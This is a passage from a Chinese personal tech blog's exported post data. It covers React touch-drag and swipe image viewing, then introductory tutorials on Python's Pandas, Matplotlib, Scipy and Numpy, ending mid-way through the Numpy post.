pageX：触摸点的 x 坐标。 pageY：触摸点的 y 坐标。 基本只需要用到这个两个属性。 这里的坐标系是以屏幕左上角为 （0，0） 点，右方为 x 轴的正方向，下方为 y 轴的正方向。 有点需要注意的：React 中使用 Touch 时 Click 是没反应，需要在 TouchEnd 中做判断做处理。 实现拖图预期效果：手指触摸图片（或某个元素），图片跟随手指进行移动，手指松开时图片停止移动。 注意：不要用 this.setState 去更新组件位置。一开始也是这样做，到后来发现这个会大量的触发 diff 代价太大，会有性能问题，还不如直接去更新 DOM。 可以得出两条非常简单的公式： 123456// 移动的距离 = 移动的触摸点位置 - 开始的触摸点位置;S = e.touches[0].pageX - this._touch.pageX;// 新的位置 = 开始的位置 + 移动的距离;P = this._touch.startOffset + S;// 直接操作 dom，而不是 this.setStatethis.dot.style.webkitTransform = `translate3d($&#123;P&#125;px, 0, 0)`; 说明： this._touch.pageX 在触发 onTouchStart 时被存储，记录着最开始的触摸点位置。 this._touch.startOffset 在触发 onTouchStart 时被存储，记录着 element 最开始的偏移量。 e.touches[0].pageX 是在 onTouchMove 时的触摸点位置。 最后在 onTouchEnd 会把新的位置作用在 element 的 transform 上。 最后记得阻止一下事件冒泡与默认行为，以到达最佳性能： 12e.preventDefault();e.stopPropagation(); 实现大图浏览既然能实现拖图，那么实现一个大图浏览也不会很难。效果类似微博 Web 移动端上的大图浏览效果，可以滑动图片哦。（gif 录制的有点卡，实际上是很顺的）预期效果：点击图片浏览大图，可以进行滑动更换图片。 有几个需要关注的地方： 边界处理。 回弹效果。 对于边界的处理，就是为了不滑出界。设定有 100px 可以允许继续滑动的距离，那么边界的条件为： 12滚屏长 = 屏幕宽度 * 图片数量-100 &lt; offsetX &lt; 滚屏长 - 100 因为是大图浏览，所以图片的宽度是占满整个屏幕宽度，而整个滚屏长度就等于屏幕宽度乘于图片数量。 回弹效果就是，当图片滑到某个位置，手指松开时，会根据当前的位置有一个弹动的动画，比如滑下一页只滑了 20%，这是应该会弹会当前页，如果是 60%，那么就应该弹到下一页的位置。 具体如何实现，可以利用四舍五入进位的方法。 假设每页的宽度是 360，如果当前的 offsetX 为 800 时（向右滑，当前页的索引是 2，也就是偏移量为 720），那么就有： 123p = 800 / 360 // 2.22i = Math.round(p) // 2p = p - (p | 0) // 0.22 如果 p 值的小数点大于 0.5 那么 i 就会进位到 3，也就是下一页的索引。如果 offsetX 为 500（向左滑），那么 p 为 1.38，小数位小于 0.5，i 就会等于 1，也就是上一页的索引。根据这个原理就可以轻易实现回弹效果了。 但是有个问题就是每次都需要滑动超过 50% 才会切换上一页/下一页。有没有办法只滑动 30% 就可以了呢？答案是有的：给它加点盐即可。如果是向右滑，则 p = p + 0.2，如果是向左滑，则 p = p - 0.2。这样设置之后，只需要滑到 0.3 或 0.7 就可以回弹了。 现在只需利用结束与开发的位置关系判断一下方向即可： 12// 结束触摸点位置 - 开始触摸的位置，根据正负数关系判断方向。const direction = (e.changedTouches[0].pageX - this._touch.pageX) &lt; 0 ? 0.2 : -0.2; 小结除此之外，还可以使用 Touch 系列的事件制作列表的下拉刷新效果，抽屉菜单效果，滑动验证码效果等触摸交互效果。实现的思路都是差不多，通过计算变化的坐标值，从而达到元素的跟手动画效果。 本示例 Demo：react-touch-demo（拖图 + 大图浏览）","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Python  大数据分析 - Pandas","slug":"Python/Python  大数据分析 - Pandas","date":"2018-02-09T13:48:37.000Z","updated":"2021-06-15T06:10:52.850Z","comments":true,"path":"/stories/2018/02/Python/Python  大数据分析 - Pandas/","link":"","permalink":"http://me.lizhooh.com/stories/2018/02/Python/Python  大数据分析 - Pandas/","excerpt":"前言Python 的语法简洁，成熟的库繁多，开发效率高，Python 在大数据分析领域上有非常好的优势。本文介绍 Python 在大数据分析领域的工具库，包括了以下这几个库： 数据分析利器：Numpy 数据可视化：Matplotlib 础数据分析：Pandas 高级科学计算：Scipy 础数据分析：PandasPandas 是一个提供快速，灵活和表达性数据结构的 Python 包，旨在使关系或标记数据变得简单直观。要记住在 Pandas 里只有两种数据结构：Series（一维） 和 DataFrame（二维），其他都是 Python 自带的数据结构和 Numpy 的数据结构。","text":"前言Python 的语法简洁，成熟的库繁多，开发效率高，Python 在大数据分析领域上有非常好的优势。本文介绍 Python 在大数据分析领域的工具库，包括了以下这几个库： 数据分析利器：Numpy 数据可视化：Matplotlib 础数据分析：Pandas 高级科学计算：Scipy 础数据分析：PandasPandas 是一个提供快速，灵活和表达性数据结构的 Python 包，旨在使关系或标记数据变得简单直观。要记住在 Pandas 里只有两种数据结构：Series（一维） 和 DataFrame（二维），其他都是 Python 自带的数据结构和 Numpy 的数据结构。 SeriesSeries 就如同列表一样，一系列数据，每个数据对应一个索引值。当你输出 Series 的数据后，会发现它是竖着放的，没错它的数据就是竖着放的，甚至可以认为 Series 就是竖起来的 list。 Series 的元素有三个部分组成：index、vaues、key。 创建Series 的创建方式有非常多种，可以使用一个列表创建，默认索引是数组的下标，也可以指定索引，当然还可以使用对象的方式来创建。 1234567891011121314151617from pandas import Seriess = Series([1, 2, 3])s = Series([1, 2, 3], ['a', 'b', 'c'])s = Series(&#123; 'a': 1, 'b': 2, 'c': 3 &#125;)'''a 1b 2c 3'''print(s)print(s[0]) # 1print(s['a']) # 1print(s.values)print(s.keys)print(s.index) 访问 Series 的数据可以根据索引也可以根据 key 来访问。 当使用对象创建时，默认会自动使用对象的 key 作为索引，如果自己手动设置索引，而索引的名称对不上就会值被设置为 NaN，因此可以利用这个特性来检查数据的 key。 123s = Series(&#123; 'a': 1, 'b': 2, 'c': 3 &#125;, index=['a', 'b', 'd'])print(s.isnull)s.index = ['a', 'b', 'c'] # 重新定义 Series 有几个属性可以查看数据，它们都支持 get、set 操作： s.values 查看所有的 value。 s.keys 查看所有的 key。 s.index 查看所有的 index。 s.dtypes 查看所有的数据类型。 s[i] 通过索引获取值。 s[key] 通过键获取值。 矢量运算因为 Series 是基于 Numpy 实现的，所以对于数组数据支持矢量运算。 12345678910s1 = Series([1, 2, 3])s2 = Series([4, 5, 6])print(s1 + s2)print(s1 - s2)print(s1 * s2)print(s1 / s2)print(s1[s1 &gt; 2])print(s2[s2 == 5]) DataFrameDataFrame 是一种二维的数据结构，非常接近于电子表格或者类似 mysql 数据库的形式。它的竖行称之为 columns，横行跟前面的 Series 一样，称之为 index，也就是说可以通过 columns 和 index 来确定一个主句的位置。 创建对于 DataFrame 的创建有几种方式，主要是 key 和 index 需要对得上。对象的 key 要看成列数据，实际上就是列方式存储。 12345678910111213141516import pandas as pdfrom pandas import Series, DataFramed = DataFrame(&#123; 'name': ['小明', '小美', '小东'], # 一列的数据 'age': [20, 19, 21], 'height': [182, 168, 176], 'weight': [61, 53, 59],&#125;)''' age height name weight0 20 182 小明 611 19 168 小美 532 21 176 小东 59'''print(d) 默认情况下使用序号作为索引，这里使用 name 作为索引。 123456789101112131415161718192021222324252627import pandas as pdfrom pandas import Series, DataFramed = DataFrame(&#123; 'age': &#123; # 一列的数据 '小明': 20, '小美': 19, '小东': 21, &#125;, 'height': &#123; '小明': 182, '小美': 168, '小东': 176, &#125;, 'weight': &#123; '小明': 61, '小美': 53, '小东': 59, &#125;&#125;)''' age height weight小东 21 176 59小明 20 182 61小美 19 168 53'''print(d) 同样 DataFrame 也支持 index 属性，类似的规则和 Series 差不多。 12345678910111213141516print(DataFrame(&#123; 'age': &#123; # 一列的数据 '小明': 20, '小美': 19, '小东': 21, &#125;, 'height': &#123; '小明': 182, '小美': 168, # 小东为 NaN &#125;, 'weight': &#123; '小明': 61, '小美': 53, '小东': 59, &#125;&#125;, index=['小明', '小东'])) # 小美将被忽略 DataFrame 有几个属性可以查看数据，它们都支持 get、set 操作： d.columns 获取所有 columns。 d.keys 获取所有 key。 d.index 获取所有 index。 d.values 获取所有 values。 d.dtypes 获取所有数据类型。 d[key] 根据 key 获取值。 d[i:j] 根据数组切片，切为几行。 1234567891011121314151617181920212223242526''' age height weight小东 21 176 59小明 20 182 61小美 19 168 53'''print(d.columns)print(d.values)print(d.keys)print(d.index)print(d['age']) # 结构就是 Seriesprint(d['age'].index) # ['小东', '小明', '小美']print(d['age'].values) # [21 20 19]print(d['age'][0]) # 21print(d['age']['小明']) # 21print(d['小东']) # xxx 报错，不可以这样print(d[0]) # xxx 报错，不可以这样''' age height weight小东 21 176 59'''print(d[0:1]) # 但是可以用切片，切片之后不是数组而是 DataFrame 数据print(d[0:1].values) # [21, 176, 59] 实际上 DataFrame 是由 Series 组成的，因此可以把一个 Series 赋值给 DataFrame 的某列（注意索引要对得上） 1234567891011121314151617181920d = DataFrame(&#123; 'age': &#123; '小明': 20, '小美': 19, '小东': 21, &#125;, 'height': &#123; '小明': 182, '小美': 168, '小东': 176, &#125;, 'weight': Series(&#123; '小明': 61, '小美': 53, '小东': 59 &#125;)&#125;)''' age height weight小东 21 176 59小明 20 182 61小美 19 168 53'''print(d) 永远都要记住一切对不上索引的数据都是会自动设置为 NaN，所以索引非常重要。 还可以这样创建数据： 12345678pd.DataFrame(&#123; 'A': 1, 'B': pd.Timestamp('20130102'), 'C': pd.Series(np.random.rand(4), index=list(range(4)), dtype='float32'), 'D': np.array([3] * 4, dtype='int32'), 'E': pd.Categorical(['test', 'train', 'test', 'train']), 'F': 'foo'&#125;) 因为 Pandas 是基于 Numpy 创建的，它可以接纳 Numpy 的数据格式和自己的数据格式。 数据读取Pandas 提供了许多的数据读取 api，包括 CSV，JSON，Excel 等数据格式，从智能提示就可以知道了。 CSVCSV 是一种通用的、相对简单的文件格式，在表格类型的数据中用途很广泛。它的格式是，一行表示一个 row 数据，每行之间用 , 分割。 12name,physics,pythonGoogle,100,100 这种格式非常好读取，如果是用 nodejs，可以瞬间把它格式化为二维数组。 12345const fs = require('fs');fs.readFild('./test.csv', data =&gt; &#123; const list = data.split('\\n').map(i =&gt; i.split(',')); console.log(list);&#125;); 在 Python 里，有专用的库去读取 CSV 文件，当然 Pandas 也提供 api。 1234567891011import pandas as pdd = pd.read_csv(\"./d.csv\", encoding='utf8')''' name physics python math english0 Google 100 100 25 121 Facebook 45 54 44 882 Twitter 54 76 13 913 Yahoo 54 452 26 100'''print(d) JSON对 JSON 的支持，可以自己用文件系统 api 先读 json 数据再解析，也可以使用 Pandas 的 api。 12345678910111213141516171819import pandas as pd'''&#123; \"name\": [\"小明\", \"小美\", \"小东\"], \"age\": [20, 19, 21], \"height\": [182, 168, 176], \"weight\": [61, 53, 59]&#125;'''d = pd.read_json('./data.json', encoding='utf8');''' age height name weight0 20 182 小明 611 19 168 小美 532 21 176 小东 59'''print(d) Excel读取 Excel 数据需要安装一个模块：xlrd，不然会报错。 1pip install xlrd 123import pandas as pdd = pd.read_excel('./data.xls', encoding='utf8');print(d) 属性与方法有一个快捷的方式可以知道对象的属性与方法。 12345678910111213141516def showKeys(obj): func = [] props = [] for i in dir(obj): if str(i)[0] != '_': if hasattr(eval('obj.' + i), '__call__'): func.append(i) else: props.append(i) print ('函数：', func) print ('属性：', props)s = Series([1, 2, 3])showKeys(s) 常用的 api： name explain d.head(2) 获取头两行，等效于 d[0:2]。 d.tail(2) 获取尾两行。 d.describe() 显示数据的快速统计摘要。 d.T 转置数据（矩阵转置）。 d.sort_index(axis=1) 索引排序。 d.sort_values(by=’age’) 列排序。 d.loc[‘小明’] 根据 index，获取横向数据。 d.loc[‘小明’, [‘age’, ‘height’]] 指定返回的数据。 d.loc[‘小明’, ‘age’] 等效于 d[‘age’][‘小明’]。 d.iloc[2] 获取索引为 2 的行数据。 d.iloc[3:5, 0:2] 数组切片，获取第 3 - 5 行，第 0 - 2 列数据。 pd.isnull(d) 返回是否是数据缺失。 d.mean() 返回一些平均数描述性信息。 s1 = s1.append(s2) 追加一个 Series 数据。 d1 = d1.append(d2) 追加一个 DataFrame 数据。 数据存储与读数据差不多，基本都是 d.to_xxx 的使用方式。 123d.to_csv('./a.csv')d.to_json('./a.json')d.to_excel('./a.xls') 参考资料 http://python.usyiyi.cn/translate/NumPy_v111/reference/index.html https://matplotlib.org/examples/index.html http://python.usyiyi.cn/translate/Pandas_0j2/index.html http://python.usyiyi.cn/translate/scipy_lecture_notes/intro/scipy.html","categories":[{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/categories/Python/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/tags/Python/"},{"name":"大数据","slug":"大数据","permalink":"http://me.lizhooh.com/tags/大数据/"}]},{"title":"Python  大数据分析 - Matplotlib","slug":"Python/Python  大数据分析 - Matplotlib","date":"2018-02-09T13:48:37.000Z","updated":"2021-06-15T06:10:52.849Z","comments":true,"path":"/stories/2018/02/Python/Python  大数据分析 - Matplotlib/","link":"","permalink":"http://me.lizhooh.com/stories/2018/02/Python/Python  大数据分析 - Matplotlib/","excerpt":"前言Python 的语法简洁，成熟的库繁多，开发效率高，Python 在大数据分析领域上有非常好的优势。本文介绍 Python 在大数据分析领域的工具库，包括了以下这几个库： 数据分析利器：Numpy 数据可视化：Matplotlib 础数据分析：Pandas 高级科学计算：Scipy 数据可视化：MatplotlibMatplotlib 是一个 Python 的数据可视化库，它是基于 Numpy 而实现的。Matplotlib 可以画出很简单的图，比如线性图，条形图，饼图，也可以画出很复杂的图，比如多维图。","text":"前言Python 的语法简洁，成熟的库繁多，开发效率高，Python 在大数据分析领域上有非常好的优势。本文介绍 Python 在大数据分析领域的工具库，包括了以下这几个库： 数据分析利器：Numpy 数据可视化：Matplotlib 础数据分析：Pandas 高级科学计算：Scipy 数据可视化：MatplotlibMatplotlib 是一个 Python 的数据可视化库，它是基于 Numpy 而实现的。Matplotlib 可以画出很简单的图，比如线性图，条形图，饼图，也可以画出很复杂的图，比如多维图。 画一个线性图对于一个数学函数来说，它的组成成分是自变量与因变量，例如：y = 2x + 1。这里 x 就是自变量，而 y 就是因变量。 123456789101112131415import matplotlib.pyplot as pltimport numpy as np# 自变量x = np.arange(0, 5, 0.1)# 因变量y1 = 2 * x + 1y2 = 2 * x - 1plt.plot(x, y1, '--', color=\"#ff4455\")plt.plot(x, y2, color=\"#3399ff\")plt.xlabel('x')plt.ylabel('y')plt.title('两条线', color='#ff4455')plt.show() 这样就可以画出两条非常简单的线性图了。实际上线性也好不线性也好只要设定好自变量与因变量，Matplotlib 就能自动帮你画出对应的图像。 加一条竖线： 1plt.plot([1, 1], [1, 3], color=\"#777777\") 在 plot 中有一个参数 linestyle 或 marker 是用来指定线条的样式的。 标记 描述 标记 描述 o 圆圈 . 点 D 菱形 s 正方形 h 六边形1 * 星号 H 六边形2 d 小菱形 _ 水平线 v 一角朝下的三角形 8 八边形 ‘ 一角朝左的三角形 p 五边形 &gt; 一角朝右的三角形 , 像素 ^ 一角朝上的三角形 + 加号 &#39; 竖线 None 无 x X 坐标轴范围设置坐标轴范围使用 xlim 和 ylim。 123456789# ...import matplotlib.pylab as lab# ...lab.xlim(-5, 10) # 设置 x 轴范围lab.ylim(-5, 10) # 设置 y 轴范围plt.plot(x, y1, '--', color=\"#ff4455\")plt.plot(x, y2, color=\"#33aaff\")# ... 区域使用 plt.axes() 定义区域，它的参数是 axes(xmin, xmax, ymin, ymax) 1234567891011import numpy as npimport matplotlib.pyplot as pltx = np.arange(0, 5, 0.1)y1 = 2 * x + 1y2 = 2 * x - 1plt.plot(x, y1, '--', color=\"#ff4455\")plt.plot(x, y2, color=\"#3399ff\")plt.axis([0, 2, 0, 4]) # 规定区域 x = [0, 2] y = [0, 4]plt.show() 子图与多图在 plot 之前添加 subplot 就可以画子图了。具体为什么 subplot 的参数一个号码，表示的图形的类型。默认是 111。 1234567# ...plt.subplot(211)plt.plot(x, y1, '--', color=\"#ff4455\")plt.subplot(212)plt.plot(x, y2, color=\"#33aaff\")# ... 如果是多个图，需要配合 figure。每调用一次，就会切换到当前的图号上下文。 1234567891011121314# ...plt.figure(1) # 图 1plt.subplot(211) # 图 1 的子图plt.plot(x, y1, '--', color=\"#ff4455\")plt.subplot(212)plt.plot(x, y2, color=\"#33aaff\")plt.figure(2) # 图 2plt.plot(x, 2 * x)plt.title('图 2')plt.figure(1) # 切换到图 1plt.title('图 1')# ... 运行之后，就可以看到有两个窗体：figure 1 和 figure 2。 文字说明所有可以用文字描述的地方都可以自定义文字说明。 text() 可以在图中的任意位置添加文字，并支持 LaTex 语法。 xlable(), ylable() 用于添加 x 轴和 y 轴标签。 title() 用于添加图的题目。 annotate() 点注释，可对某个坐标点进行注释。doc legend() 添加图例。 xticks(), yticks() 用于把序号替换为文字表示。参数为 xticks(indexs, texts) 123456789101112131415161718192021222324252627282930import matplotlib.pyplot as pltimport numpy as npx = np.arange(0.0, 1.5, 0.01)y1 = np.cos(2 * np.pi * x) # cos(2πx)y2 = np.sin(2 * np.pi * x) # sin(2πx)plt.plot(x, y1, color=\"#ff4455\", label='cos(2πx)')plt.annotate( '最大值', xy=(1, 1), # 坐标 xytext=(1, 1.35), # 文本位置 arrowprops=&#123; 'arrowstyle':\"-&gt;\", &#125;,)plt.plot(x, y2, color=\"#33aaff\", label='sin(2πx)')plt.annotate( '最小值', xy=(0.5, -1), # 坐标 xytext=(0.35, -1.35), # 文本位置 arrowprops=&#123; 'arrowstyle':\"-&gt;\", &#125;,)plt.legend(loc=\"upper left\")plt.ylim(-2, 2)plt.show() 基本图形基本图形包括了折线图，条形图，饼图和其他。 折线图折线图使用的是 plt.plot 这个 api。它和函数图差不多，只不过函数图大多都是连续线性的，而折线图可能是不连续，非线续的。 1234567891011121314151617181920212223242526272829import numpy as npimport matplotlib.pyplot as pltM = 4x = np.arange(M)y1 = np.random.rand(M)y2 = np.random.rand(M)plt.plot(x, y1, color='#ff4455', label='盈利')plt.plot(x, y2, color='#33aaff', label='亏损')# 点注释for i in x: ys = [y1, y2] cs = ['#ff4455', '#33aaff'] for j in range(len(ys)): _x = i _y = ys[j][i] plt.plot([_x], [_y], 'o', color=cs[j], alpha=0.65) plt.annotate( round(_y, 2), xy=(_x, _y), # 坐标 xytext=(_x - 0.08, _y + 0.015), # 文本位置 )plt.xticks(x, ['第一季度', '第二季度', '第三季度', '第四季度'])plt.legend(loc=\"upper left\")plt.ylim(0, 1)plt.show() 条形图条形图使用的是 plt.bar 这个 api。 1234567891011121314151617import numpy as npimport matplotlib.pyplot as pltx = np.arange(4)y1 = np.random.randint(0, 50, 4)y2 = np.random.randint(0, 60, 4)plt.bar(x - 0.21, y1, width=0.2, color='#ff4455', label='盈利')plt.bar(x + 0.00, y2, width=0.2, color='#33aaff', label='亏损')plt.bar(x + 0.21, y1, width=0.2, color='black', bottom=0, alpha=0.45)plt.bar(x + 0.21, y2, width=0.2, color='black', bottom=y1, alpha=0.25)plt.xticks([0, 1, 2, 3], ['第一季度', '第二季度', '第三季度', '第四季度'])plt.legend(loc=\"upper left\")plt.show() 条形图有横向与纵向之分，来看看横向条形图（使用 plt.barh）。 1234567891011121314151617import numpy as npimport matplotlib.pyplot as pltx = np.arange(4)y1 = np.random.randint(0, 50, 4)y2 = np.random.randint(0, 60, 4)plt.barh(x - 0.21, y1, height=0.2, color='#ff4455', label='盈利')plt.barh(x + 0.00, y2, height=0.2, color='#33aaff', label='亏损')plt.barh(x + 0.21, y1, height=0.2, color='black', left=0, alpha=0.45)plt.barh(x + 0.21, y2, height=0.2, color='black', left=y1, alpha=0.25)plt.yticks([0, 1, 2, 3], ['第一季度', '第二季度', '第三季度', '第四季度'])plt.legend(loc=\"upper right\")plt.show() 饼图条形图使用的是 plt.pie 这个 api。 12345678910import numpy as npimport matplotlib.pyplot as pltx = [15, 30, 45, 10]y = [0, 0.05, 0.08, 0] # &lt;- 饼的偏移量labels = ['第一季度', '第二季度', '第三季度', '第四季度']colors = ['#33aaff', '#ff4455', '#33bb44', '#ff9900']plt.axes(aspect=1)plt.pie(x, y, labels, colors, autopct='%.0f%%')plt.show() 直方图条形图使用的是 plt.hist 这个 api。 123456import numpy as npimport matplotlib.pyplot as pltx = 100 + 20 * np.random.randn(20000)plt.hist(x, bins=100, color='#33aaff', normed=False)plt.show() 散点图散点图使用的是 plt.scatter 这个 api。 123456789101112131415import numpy as npimport matplotlib.pyplot as pltx1 = np.random.rand(2, 25)x2 = np.random.rand(2, 25)x3 = np.random.rand(2, 25)x4 = np.random.rand(2, 25)plt.scatter(x1[0], x1[1], marker='x', color='#33aaff', label='第一季度')plt.scatter(x2[0], x2[1], marker='+', color='#ff4455', label='第二季度')plt.scatter(x3[0], x3[1], marker='.', color='#33bb44', label='第三季度')plt.scatter(x4[0], x4[1], marker='*', color='#ff9900', label='第四季度')plt.legend(loc = 'upper right')plt.show() 参考资料 http://python.usyiyi.cn/translate/NumPy_v111/reference/index.html https://matplotlib.org/examples/index.html http://python.usyiyi.cn/translate/Pandas_0j2/index.html http://python.usyiyi.cn/translate/scipy_lecture_notes/intro/scipy.html","categories":[{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/categories/Python/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/tags/Python/"},{"name":"大数据","slug":"大数据","permalink":"http://me.lizhooh.com/tags/大数据/"}]},{"title":"Python  大数据分析 - Scipy","slug":"Python/Python  大数据分析 - Scipy","date":"2018-02-09T13:48:37.000Z","updated":"2021-06-15T06:10:52.850Z","comments":true,"path":"/stories/2018/02/Python/Python  大数据分析 - Scipy/","link":"","permalink":"http://me.lizhooh.com/stories/2018/02/Python/Python  大数据分析 - Scipy/","excerpt":"前言Python 的语法简洁，成熟的库繁多，开发效率高，Python 在大数据分析领域上有非常好的优势。本文介绍 Python 在大数据分析领域的工具库，包括了以下这几个库： 数据分析利器：Numpy 数据可视化：Matplotlib 础数据分析：Pandas 高级科学计算：Scipy 高级科学计算：ScipyScipy 是一个高级的科学计算库，它是构建在 Numpy 之上的。Scipy 有很多子模块可以应对不同的应用，例如插值运算，优化算法、图像处理、数学统计等。","text":"前言Python 的语法简洁，成熟的库繁多，开发效率高，Python 在大数据分析领域上有非常好的优势。本文介绍 Python 在大数据分析领域的工具库，包括了以下这几个库： 数据分析利器：Numpy 数据可视化：Matplotlib 础数据分析：Pandas 高级科学计算：Scipy 高级科学计算：ScipyScipy 是一个高级的科学计算库，它是构建在 Numpy 之上的。Scipy 有很多子模块可以应对不同的应用，例如插值运算，优化算法、图像处理、数学统计等。 模块Scipy 里的模块非常多，它包括了： 模块 说明 scipy.cluster 矢量量化/Kmeans scipy.constants 物理和数学常数 scipy.fftpack 傅里叶变换 scipy.integrate 集成例程 scipy.interpolate 插值 scipy.io 数据输入和输出 scipy.linalg 线性代数例程 scipy.ndimage n 维图像包 scipy.odr 正交距离回归 scipy.optimize 优化与拟合 scipy.signal 信号处理 scipy.sparse 稀疏矩阵 scipy.spatial 空间数据结构和算法 scipy.special 任何特殊的数学函数 scipy.stats 统计 一般来说我们并不需要了解全部的模块，只需要按部就班就可。 优化和拟合scipy.optimize 里包含了需要优化与拟合的函数，帮你计算各种复杂的公式。使用它非常简单，只需要把参数放进，之后等待计算结果，期间没有任何烦恼。 例如，下面有一个一元二次方程，为了找到这个方程的最优解（最小值），我们可以自己去动手解方程组，也可以使用 optimize 模块的函数。 在这里使用的是一个 BGFS 算法来解题。 BFGS 算法（BFGS algorithm），是一种逆秩 2 拟牛顿法。 123456789101112131415161718192021import numpy as npimport matplotlib.pyplot as pltfrom scipy import optimizef = lambda x: (x - 4) ** 2 + 16 * x - 2x = np.arange(-10, 10, 0.1)plt.plot(x, f(x), color=\"#ff4455\")plt.ylim(-10, 50)plt.show()fmin = optimize.fmin_bfgs(f, 0) # 从 0 点开始'''Optimization terminated successfully. Current function value: -2.000000 # 最小值 f(x) Iterations: 3 Function evaluations: 12 Gradient evaluations: 4[-4.0000002487074] # 最小值的 x'''print(fmin) 最后通过 optimize.fmin_bfgs 这个函数，成功找到了最低点是 （-4, -2）。 除了使用 fmin_bfgs，还可以使用 optimize.basinhopping 这个函数，同样也可以找到相应的结果。 统计scipy.stats 包括了一系列的统计函数。例如我们可以利用 norm.fit 来计算正态分布函数的均值与标准差。 1234567891011121314import numpy as npfrom scipy import statsa = np.random.normal(size=1000)loc, std = stats.norm.fit(a)print(loc) # 均值print(std) # 方差print(stats.scoreatpercentile(a, 50)) # 中值print('')print(np.mean(a)) # 均值print(np.std(a)) # 方差print(np.median(a)) # 中值 当然有些功能与 Numpy 重复了。 还可以利用 stats.ttest_ind 做统计测试。 统计测试是决策指标。例如，如果我们有两组观察值，我们假设从高斯过程产生，我们可以使用 T-test 来决定两组观察值是否有明显的不同。 12345678import numpy as npfrom scipy import statsa = np.random.normal(0, 1, size=100)b = np.random.normal(1, 1, size=10)r = stats.ttest_ind(a, b)print(r) 结果输出包括： T 统计值：它是一个数，其符号与两个随机过程之间的差成比例，并且该量值与该差的显着性相关。 p 值：两个进程的概率相同。如果接近 1，这两个过程几乎肯定是相同的。越接近零，过程具有不同手段的可能性越大。 这是属于数学体系 - 统计学的知识，就不在这里一一述说。 参考资料 http://python.usyiyi.cn/translate/NumPy_v111/reference/index.html https://matplotlib.org/examples/index.html http://python.usyiyi.cn/translate/Pandas_0j2/index.html http://python.usyiyi.cn/translate/scipy_lecture_notes/intro/scipy.html","categories":[{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/categories/Python/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/tags/Python/"},{"name":"大数据","slug":"大数据","permalink":"http://me.lizhooh.com/tags/大数据/"}]},{"title":"Python  大数据分析 - Numpy","slug":"Python/Python  大数据分析 - Numpy","date":"2018-02-09T13:48:37.000Z","updated":"2021-06-15T06:10:52.849Z","comments":true,"path":"/stories/2018/02/Python/Python  大数据分析 - Numpy/","link":"","permalink":"http://me.lizhooh.com/stories/2018/02/Python/Python  大数据分析 - Numpy/","excerpt":"前言Python 的语法简洁，成熟的库繁多，开发效率高，Python 在大数据分析领域上有非常好的优势。本文介绍 Python 在大数据分析领域的工具库，包括了以下这几个库： 数据分析利器：Numpy 数据可视化：Matplotlib 础数据分析：Pandas 高级科学计算：Scipy 数据分析利器：NumpyNumpy 是什么？Numpy 就是一个 Python 的科学计算库，可用于科学计算，大数据分析，具有矢量运算能力，快速、节省空间的特点。下面就来介绍一下 Numpy 的使用方法与基本知识。","text":"前言Python 的语法简洁，成熟的库繁多，开发效率高，Python 在大数据分析领域上有非常好的优势。本文介绍 Python 在大数据分析领域的工具库，包括了以下这几个库： 数据分析利器：Numpy 数据可视化：Matplotlib 础数据分析：Pandas 高级科学计算：Scipy 数据分析利器：NumpyNumpy 是什么？Numpy 就是一个 Python 的科学计算库，可用于科学计算，大数据分析，具有矢量运算能力，快速、节省空间的特点。下面就来介绍一下 Numpy 的使用方法与基本知识。 安装安装 Numpy 不能直接 pip install，需要先下载一个文件 .whl - Download 下载后，去到文件目录里进行安装： 123456cd D:\\Numpypip install numpy-1.14.0-cp36-none-win32.whl # 我 64 位，只能安装 32 位才成功？Processing d:\\numpy\\numpy-1.14.0-cp36-none-win32.whlInstalling collected packages: numpySuccessfully installed numpy-1.14.0 安装成功后，测试一下： 12import numpy as npprint (np.random.rand(4, 4)) 能正常输出随机矩阵就可以了。 维数组Python 里有列表（List），但是在我看来就是数组，Numpy 里有自己的数组（ndarray），要求是数组的类型是相同的。 Numpy.array 有几个比较常用的属性： ndim 表示维度个数。 shape 表示各维度大小。 dtype 表示数据类型。 Numpy.array 的构造函数可以使用列表来初始化，初始化的维度自动识别。 12345678910111213141516a1 = np.array([1, 2, 3, 4, 5])a2 = np.array([ [1, 2, 3], [4, 5, 6],])print(type(a1)) # &lt;class 'numpy.ndarray'&gt;print (a1.dtype) # init 32print (a2.dtype) # init 32print (a1.ndim) # 维度 1print (a2.ndim) # 维度 2print (a1.shape) # (6, )print (a2.shape) # (2, 3) (行, 列) 在构造时可以传入参数指定数组类型。 123import numpy as npx = np.array([1, 2.6, 3], np.int64)print(x.dtype) # int64 矢量化运算ndarray 支持矢量运算，要求就是要有相同的维度。 1234567import numpyx = numpy.array([1, 2, 3])print(x * 2) # [2 4 6]print(x &gt; 2) # [False False True]y = numpy.array([3, 4, 5])print(x + y) # [4 6 8]print(x &gt; y) # [False False False] 数组索引ndarray 的索引非常多种玩法。常见的有普通索引，不常见的有布尔索引和花式索引。 123456789101112131415161718192021222324import numpyx = numpy.array([[1, 2], [3, 4], [5, 6]])print(x[0]) # [1,2] 第 0 列print(x[0][1]) # 2print(x[0, 1]) # 2x = numpy.array([ [ [1, 2], [3, 4]], [[5, 6], [7, 8] ]])print(x[0]) # [[1 2], [3 4]]x = numpy.array([3, 2, 3, 1, 3, 0])y = numpy.array([True, False, True, False, True, False])print(x[y]) # [3,3,3]，x[ 这里是接收布尔值 ]print(x[y == False]) # [2,1,0]print(x &gt;= 3) # [ True False True False True False] 矢量运算print x[~(x &gt;= 3)] # [2,1,0]print((x == 2) | (x == 1)) # [False True False True False False]print(x[(x == 2) | (x == 1)]) # [2 1] 数组切片ndarray 的切片基本与 Python 列表相同。 1234567891011121314import numpyx = numpy.array([1, 2, 3, 4, 5])print(x[1:3]) # [2,3]print(x[:3]) # [1,2,3]print(x[1:]) # 